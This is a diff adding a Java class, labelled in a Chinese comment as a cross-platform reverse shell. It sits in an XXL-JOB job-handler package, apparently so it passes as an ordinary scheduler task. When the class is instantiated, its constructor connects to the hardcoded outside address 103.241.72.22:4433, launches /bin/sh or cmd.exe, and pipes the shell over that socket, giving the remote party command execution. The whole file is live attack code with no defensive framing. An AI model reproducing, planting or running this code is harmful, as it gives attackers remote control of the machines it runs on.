@@ -1,0 +1,90 @@
+//java代码 win linxu 通用反弹
+package com.xxl.job.service.handler;
+
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.net.Socket;
+
+public class reverse {
+    class StreamConnector
+    extends Thread
+    {
+        InputStream hx;
+        OutputStream il;
+
+        StreamConnector(InputStream hx, OutputStream il)
+        {
+            this.hx = hx;
+            this.il = il;
+        }
+
+        public void run()
+        {
+            BufferedReader ar = null;
+            BufferedWriter slm = null;
+            try
+                {
+                    ar = new BufferedReader(new InputStreamReader(this.hx));
+                    slm = new BufferedWriter(new OutputStreamWriter(this.il));
+                    char[] buffer = new char[8192];
+                    int length;
+                    while ((length = ar.read(buffer, 0, buffer.length)) > 0)
+                    {
+                        slm.write(buffer, 0, length);
+                        slm.flush();
+                    }
+                }
+            catch (Exception localException) {}
+            try
+                {
+                    if (ar != null) {
+                        ar.close();
+                    }
+                    if (slm != null) {
+                        slm.close();
+                    }
+                }
+            catch (Exception localException1) {}
+        }
+    }
+    public reverse()
+    {
+        reverseConn("103.241.72.22:4433");
+    }
+
+    public static void main(String[] args) 
+    {
+        System.out.println("0");
+    }
+
+    public void reverseConn(String ip)
+    {
+        String ipport = ip;
+        try
+            {
+                String ShellPath;
+                if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+                    ShellPath = new String("/bin/sh");
+                } else {
+                    ShellPath = new String("cmd.exe");
+                }
+                Socket socket = new Socket(ipport.split(":")[0], 
+                                           Integer.parseInt(ipport.split(":")[1]));
+                Process process = Runtime.getRuntime().exec(ShellPath);
+                new StreamConnector(process.getInputStream(), 
+                                    socket.getOutputStream()).start();
+                new StreamConnector(process.getErrorStream(), 
+                                    socket.getOutputStream()).start();
+                new StreamConnector(socket.getInputStream(), 
+                                    process.getOutputStream()).start();
+            }
+        catch (Exception e)
+            {
+                e.printStackTrace();
+            }
+    }
+}
